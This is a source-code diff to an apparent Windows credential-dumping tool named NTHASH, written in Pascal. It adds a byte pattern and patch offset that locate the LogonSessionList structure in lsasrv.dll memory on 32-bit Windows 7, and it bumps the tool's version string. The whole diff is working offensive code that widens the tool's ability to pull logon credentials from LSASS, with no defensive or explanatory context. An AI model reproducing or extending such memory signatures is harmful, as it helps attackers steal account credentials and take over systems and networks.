@@ -739,6 +739,8 @@ const
   PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
   PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
+  //x86
+  PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
 var
@@ -788,7 +790,12 @@ begin
      end;
   if (lowercase(osarch)='x86') then
      begin
-        //
+          if copy(winver,1,3)='6.1' then
+          begin
+          setlength(pattern,sizeof(PTRN_WNO8_LogonSessionList_x86));
+          copymemory(@pattern[0],@PTRN_WNO8_LogonSessionList_x86[0],sizeof(PTRN_WNO8_LogonSessionList_x86));
+          patch_pos:=-11;
+          end;
      end;
 
   if patch_pos =0 then
@@ -838,6 +845,7 @@ begin
                                    //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                                    //new offset to the list entry
                                    {$ifdef CPU64}
+
                                    offset:= offset+offset_list_dword+4+patch_pos;
                                    {$endif CPU64}
                                    {$ifdef CPU32}
@@ -1240,7 +1248,7 @@ end;
 
 
 begin
-  log('NTHASH 1.2 by erwan2212@gmail.com',1);
+  log('NTHASH 1.3 by erwan2212@gmail.com',1);
   winver:=GetWindowsVer;
   osarch:=getenv('PROCESSOR_ARCHITECTURE');
   log('Windows Version:'+winver,1);
